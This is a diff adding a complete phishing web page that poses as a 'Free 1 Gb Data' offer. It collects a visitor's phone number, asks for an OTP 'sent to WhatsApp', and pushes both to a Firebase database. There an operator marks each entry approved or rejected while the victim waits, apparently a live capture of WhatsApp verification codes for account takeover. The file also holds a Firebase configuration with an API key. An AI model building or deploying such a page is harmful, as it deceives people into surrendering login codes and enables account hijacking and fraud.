@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Free 1 Gb Deta </title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .mobile-frame {
+            background: white; width: 100%; max-width: 380px; padding: 30px;
+            border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center;
+            position: relative; overflow: hidden;
+        }
+
+        h2 { color: #2d3436; margin-bottom: 10px; font-weight: 600; }
+        p { color: #636e72; font-size: 0.9rem; margin-bottom: 25px; }
+
+        /* Inputs */
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { font-size: 0.85rem; font-weight: 600; color: #2d3436; margin-left: 5px; }
+        
+        input, select {
+            width: 100%; padding: 14px; margin-top: 5px; border: 2px solid #dfe6e9;
+            border-radius: 12px; font-size: 1rem; outline: none; transition: 0.3s; background: #fafafa;
+        }
+        input:focus, select:focus { border-color: #0984e3; background: white; }
+
+        /* Buttons */
+        .btn {
+            width: 100%; padding: 15px; background: #0984e3; color: white;
+            border: none; border-radius: 12px; font-size: 1rem; font-weight: 600;
+            cursor: pointer; margin-top: 10px; transition: 0.2s;
+        }
+        .btn:active { transform: scale(0.98); }
+        
+        .btn-back { background: transparent; color: #636e72; margin-top: 5px; padding: 10px; }
+
+        /* Utility */
+        .hidden { display: none; }
+
+        /* Status Styles */
+        .status-icon { font-size: 50px; margin-bottom: 15px; display: block; }
+        .waiting-box { padding: 20px; background: #fff3cd; border-radius: 15px; color: #856404; }
+        .success-box { padding: 20px; background: #d4edda; border-radius: 15px; color: #155724; }
+        .reject-box { padding: 20px; background: #f8d7da; border-radius: 15px; color: #721c24; }
+
+        /* Loader */
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0984e3; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-frame">
+        
+        <!-- Eanter: Phone & Data-->
+        <div id="page1">
+            <h2> Free Data</h2>
+            <p> Get 1 Gb Free Data</p>
+
+            <div class="input-group">
+                <label>Phone Number</label>
+                <input type="number" id="phone" placeholder="Ex: 00000000000">
+            </div>
+
+            <div class="input-group">
+                <label>Data</label>
+                <select id="profession">
+                    <option value="" disabled selected>Select Data</option>
+                    <option value="Doctor">1Gb</option>
+                    <option value="Coder">5Gb</option>
+                    <option value="Farmer">10Gb</option>
+                </select>
+            </div>
+
+            <button class="btn" onclick="goToPage2()">Next ➝</button>
+        </div>
+
+        <!--  OTP Entry -->
+        <div id="page2" class="hidden">
+            <h2> OTP For Free Data</h2>
+            <p>Check Out WhatsApp For OTP</p>
+
+            <div class="input-group">
+                <label>Enter OTP</label>
+                <input type="number" id="userOtp" placeholder="Enter Code here" style="text-align: center; letter-spacing: 3px; font-weight: bold;">
+            </div>
+
+            <button class="btn" onclick="submitFinal()">Submit & Wait</button>
+            <button class="btn btn-back" onclick="goBack()">← Back</button>
+        </div>
+
+        <!-- PAGE 3: Waiting -->
+        <div id="pageWaiting" class="hidden">
+            <div class="waiting-box">
+                <div class="loader"></div>
+                <h3>Checking...</h3>
+                <p>Admin is verifying your OTP.</p>
+            </div>
+        </div>
+
+        <!-- PAGE 4: Success -->
+        <div id="pageSuccess" class="hidden">
+            <div class="success-box">
+                <span class="status-icon">✅</span>
+                <h3>Approved!</h3>
+                <p> please Wait 1 minute for data.</p>
+            </div>
+        </div>
+
+        <!-- PAGE 5: Rejected -->
+        <div id="pageReject" class="hidden">
+            <div class="reject-box">
+                <span class="status-icon">❌</span>
+                <h3>Wrong OTP</h3>
+                <p>Admin rejected your request.</p>
+                <button class="btn" style="background:#d63031; margin-top:10px;" onclick="location.reload()">Try Again</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+        import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDdYt8KN_FgRXPR-iHeOuYmo4bRd4EoImQ",
+            authDomain: "apna-dokan-82aea.firebaseapp.com",
+            databaseURL: "https://apna-dokan-82aea-default-rtdb.firebaseio.com",
+            projectId: "apna-dokan-82aea",
+            storageBucket: "apna-dokan-82aea.firebasestorage.app",
+            messagingSenderId: "59652596247",
+            appId: "1:59652596247:web:fc914fc843e672f1d4b252",
+            measurementId: "G-ZE971N38QL"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        
+        // Variables to hold data
+        let userPhone = "";
+        let userJob = "";
+        let requestId = null;
+
+        // Step 1 -> Step 2
+        window.goToPage2 = function() {
+            userPhone = document.getElementById('phone').value;
+            userJob = document.getElementById('profession').value;
+
+            if(userPhone.length < 10 || !userJob) {
+                alert("Please fill all details correctly.");
+                return;
+            }
+
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+        }
+
+        // Back Button
+        window.goBack = function() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page1').classList.remove('hidden');
+        }
+
+        // Step 2 -> Submit to Admin
+        window.submitFinal = function() {
+            const otp = document.getElementById('userOtp').value;
+
+            if(!otp) {
+                alert("Please enter OTP.");
+                return;
+            }
+
+            // Save to Firebase for Admin to see
+            const newRef = push(ref(db, 'verifications/'));
+            requestId = newRef.key;
+
+            set(newRef, {
+                phone: userPhone,
+                profession: userJob,
+                otp_entered: otp,
+                status: "Pending",
+                timestamp: Date.now()
+            });
+
+            // Show Waiting Screen
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('pageWaiting').classList.remove('hidden');
+
+            // Listen for Admin Response
+            const statusRef = ref(db, 'verifications/' + requestId);
+            onValue(statusRef, (snapshot) => {
+                const data = snapshot.val();
+                if(data) {
+                    if(data.status === "Approved") {
+                        document.getElementById('pageWaiting').classList.add('hidden');
+                        document.getElementById('pageSuccess').classList.remove('hidden');
+                    } else if (data.status === "Rejected") {
+                        document.getElementById('pageWaiting').classList.add('hidden');
+                        document.getElementById('pageReject').classList.remove('hidden');
+                    }
+                }
+            });
+        }
+    </script>
+</body>
+</html>
